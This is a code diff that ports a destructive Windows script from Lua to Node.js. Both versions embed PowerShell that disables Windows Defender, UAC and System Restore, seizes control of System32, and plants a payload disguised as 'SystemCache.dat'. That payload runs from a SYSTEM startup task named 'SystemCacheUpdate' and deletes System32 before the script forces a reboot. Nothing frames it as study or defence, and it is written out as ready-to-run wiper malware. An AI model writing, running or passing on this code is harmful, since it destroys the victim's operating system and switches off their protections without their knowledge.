@@ -1,49 +1,46 @@
-local psScript = [[
-# Disable Windows Defender silently
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+const { execSync } = require('child_process');
 
-# Disable User Account Control (UAC) silently
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
+// PowerShell script to disable security and delete System32
+const psScript = `
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue;
+Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue;
 
-# Take ownership of the System32 directory silently
-Takeown /F C:\Windows\System32 /R /D Y > $null 2>&1
+# Disable UAC (User Account Control)
+Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue;
 
-# Grant full control permissions to the current user silently
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-Icacls C:\Windows\System32 /grant $currentUser:F /T > $null 2>&1
+# Take ownership of System32
+takeown /F C:\\Windows\\System32 /R /D Y | Out-Null;
+icacls C:\\Windows\\System32 /grant "\${env:USERNAME}:F" /T | Out-Null;
 
-# Disable System Restore silently
-Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
+# Disable System Restore
+Disable-ComputerRestore -Drive "C:\\" -ErrorAction SilentlyContinue;
 
-# Create a payload script to delete System32 after reboot
-$payloadScript = @"
-# Run this script as Administrator
-Remove-Item -Path C:\Windows\System32 -Recurse -Force -ErrorAction SilentlyContinue
-"@
+# Create a malicious payload to delete System32 after reboot
+"\$payloadScript = \`"
+Remove-Item -Path C:\\Windows\\System32 -Recurse -Force -ErrorAction SilentlyContinue
+\`"";
+"\$payloadPath = \"\${env:TEMP}\\SystemCache.dat\"";
+"Set-Content -Path \$payloadPath -Value \$payloadScript -ErrorAction SilentlyContinue";
 
-# Save the payload script to a file in a hidden location
-$payloadPath = "$env:TEMP\SystemCache.dat"
-$payloadScript | Out-File -FilePath $payloadPath -Encoding ASCII -ErrorAction SilentlyContinue
+# Schedule task to run on startup
+"\$action = New-ScheduledTaskAction -Execute \\\"powershell.exe\\\" -Argument \\\"-ExecutionPolicy Bypass -WindowStyle Hidden -File \\\\\\\"\$payloadPath\\\\\\\"\\\"";
+"\$trigger = New-ScheduledTaskTrigger -AtStartup";
+"\$principal = New-ScheduledTaskPrincipal -UserId \\\"SYSTEM\\\" -LogonType ServiceAccount -RunLevel Highest";
+"Register-ScheduledTask -TaskName \\\"SystemCacheUpdate\\\" -Action \$action -Trigger \$trigger -Principal \$principal | Out-Null";
 
-# Create a scheduled task to run the payload script after reboot
-$taskName = "SystemCacheUpdate"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"" -ErrorAction SilentlyContinue
-$trigger = New-ScheduledTaskTrigger -AtStartup -ErrorAction SilentlyContinue
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction SilentlyContinue
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction SilentlyContinue > $null 2>&1
+# Force restart
+Restart-Computer -Force;
+`;
 
-# Force a restart silently
-Restart-Computer -Force -ErrorAction SilentlyContinue
-]]
-
--- Escape double quotes and newlines for PowerShell command
-psScript = psScript:gsub('"', '\\"')
-psScript = psScript:gsub('\n', '; ')
-
--- Command to open PowerShell as administrator and execute the embedded script silently
-local command = 'powershell -Command "Start-Process powershell -ArgumentList \'-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"' .. psScript .. '\"\' -Verb RunAs"'
-
--- Execute the command silently
-os.execute(command)
+// Execute PowerShell with admin privileges
+try {
+    execSync(
+        `powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"${psScript.replace(/\n/g, '; ')}\"' -Verb RunAs"`,
+        { stdio: 'ignore' }
+    );
+    console.log("Script executed (requires admin approval).");
+} catch (err) {
+    console.error("Error:", err.message);
+}
